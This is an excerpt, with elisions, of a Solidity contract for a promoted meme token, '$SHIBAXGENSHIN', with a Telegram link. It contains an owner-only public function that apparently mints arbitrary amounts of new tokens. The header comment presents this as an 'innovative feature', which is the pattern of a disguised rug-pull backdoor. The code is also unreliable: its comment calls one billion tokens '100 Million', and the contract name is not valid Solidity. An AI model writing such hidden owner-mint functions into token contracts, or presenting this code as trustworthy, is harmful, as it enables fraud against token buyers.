...
//
// $SHIBAXGENSHIN proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/shibaXgenshin
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function shibaxgenshin(uint256 amount) public onlyOwner {
    _shibaxgenshin(msg.sender, amount);
    }
    ...
    function _shibaxgenshin(address account, uint256 amount) internal virtual {
...
contract $SHIBAXGENSHIN is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SHIBAX GENSHIN", "SXG") {
        _shibaxgenshin(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}